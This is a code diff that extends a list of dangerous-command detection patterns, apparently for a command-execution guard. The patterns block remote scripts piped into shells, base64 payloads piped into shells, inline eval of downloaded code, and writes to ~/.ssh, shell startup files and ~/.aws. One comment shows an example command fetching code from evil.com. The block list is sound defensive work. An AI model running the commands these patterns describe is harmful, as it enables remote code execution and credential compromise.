@@ -26,6 +26,27 @@ _DANGEROUS_COMMAND_PATTERNS = [
     r"\bshutdown\b",
     r"\breboot\b",
     r":>\s*/",  # truncating arbitrary root-level files
+    # Remote script fetched and piped straight into a shell interpreter.
+    r"\b(curl|wget)\b[^|;\n]*\|\s*(sudo\s+)?(sh|bash|zsh|python[23]?|perl)\b",
+    # Same pattern via process substitution / explicit redirection, e.g.
+    # `bash <(curl ...)` or `wget -O- ... | bash`.
+    r"\b(sh|bash|zsh)\s+<\(\s*(curl|wget)\b",
+    # Base64 (or similar) decoded payload piped into a shell.
+    r"\bbase64\b[^|;\n]*\|\s*(sudo\s+)?(sh|bash|zsh)\b",
+    # Inline code execution fed by a remote download, e.g.
+    # `python -c "$(curl -s http://evil.com/x.py)"` or `eval "$(curl ...)"`.
+    # Deliberately NOT blocking bare `python -c`/`eval`/etc: those are
+    # extremely common, entirely legitimate one-liners on their own
+    # (e.g. `eval "$(pyenv init -)"`, `python -c "print(1)"`), and blocking
+    # them outright (with no way to confirm/override) would break normal
+    # workflows. The actual risk is remote content being executed inline.
+    r"\b(python[23]?\s+-c|perl\s+-e|ruby\s+-e|node\s+-e|eval|exec\s*\()"
+    r"[^\n]*\$\(\s*(curl|wget)\b",
+    # Writing to sensitive dotfiles/credentials that affect the user account
+    # beyond the workspace.
+    r">>?\s*~?/?\.ssh/",
+    r">>?\s*~?/?\.(bash_profile|bashrc|zshrc|profile)\b",
+    r">>?\s*~/\.aws/",
 ]
 
 
